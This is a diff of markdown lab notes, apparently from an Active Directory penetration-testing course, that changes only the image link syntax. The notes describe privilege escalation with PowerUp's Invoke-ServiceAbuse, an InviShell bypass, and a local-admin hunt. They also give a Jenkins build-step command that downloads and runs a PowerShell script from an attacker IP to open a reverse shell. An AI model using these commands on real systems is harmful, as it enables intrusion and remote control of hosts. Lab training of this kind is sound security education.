@@ -17,16 +17,16 @@ proc.waitForOrKil
 ## Learning Objective
 
 ### Exploit a service on dcorp-student and elevate privileges to local administrator
-![[assets/Pasted image 20260131025527.png|Pasted image 20260131025527.png]]
+![Pasted image 20260131025527.png](assets/Pasted%20image%2020260131025527.png)
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`
 
 `C:\AD\Tools\PowerUp.ps1`
 
 `Invoke-AllChecks`
-![[assets/Pasted image 20260131025716.png|Pasted image 20260131025716.png]]
+![Pasted image 20260131025716.png](assets/Pasted%20image%2020260131025716.png)
 - vulnerable to unquoted service paths
 
-![[assets/Pasted image 20260131025804.png|Pasted image 20260131025804.png]]
+![Pasted image 20260131025804.png](assets/Pasted%20image%2020260131025804.png)
 - modifiable service that we can restart
 	- this one is easier
 	- running `help Invoke-ServiceAbuse` shows potential ways to use the script
@@ -34,17 +34,17 @@ proc.waitForOrKil
 - we ideally want an already created domain user and will just give them administrator
 
 `Invoke-ServiceAbuse -Name '<service_name>' -UserName <DOMAIN>\<user> -Verbose`
-![[assets/Pasted image 20260131030328.png|Pasted image 20260131030328.png]]
+![Pasted image 20260131030328.png](assets/Pasted%20image%2020260131030328.png)
 
 
 ### Identify a machine in the domain where student has local administrator access
-![[assets/Pasted image 20260131025527.png|Pasted image 20260131025527.png]]
+![Pasted image 20260131025527.png](assets/Pasted%20image%2020260131025527.png)
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`
 
 `C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
 `Find-PSRemotingLocalAdminAccess -Verbose`
 - going to be very noisy 
-![[assets/Pasted image 20260131030756.png|Pasted image 20260131030756.png]]
+![Pasted image 20260131030756.png](assets/Pasted%20image%2020260131030756.png)
 
 
 
@@ -53,4 +53,4 @@ login -> go to projects -> choose a project -> see if you can modify
 - if you are able to modify, you can add build step -> execute Windows batch command -> `powershell iex (iwr -UseBasicParsing`  http://IP/Invoke-PowerShellTCP.ps1);power -Reverse -IPAddress IP -Port \<port\>
 	- creates a reverse shell and connects back to iP and port specified
 	- once done, go back and run the project
-![[assets/Pasted image 20260131031834.png|Pasted image 20260131031834.png]]
+![Pasted image 20260131031834.png](assets/Pasted%20image%2020260131031834.png)
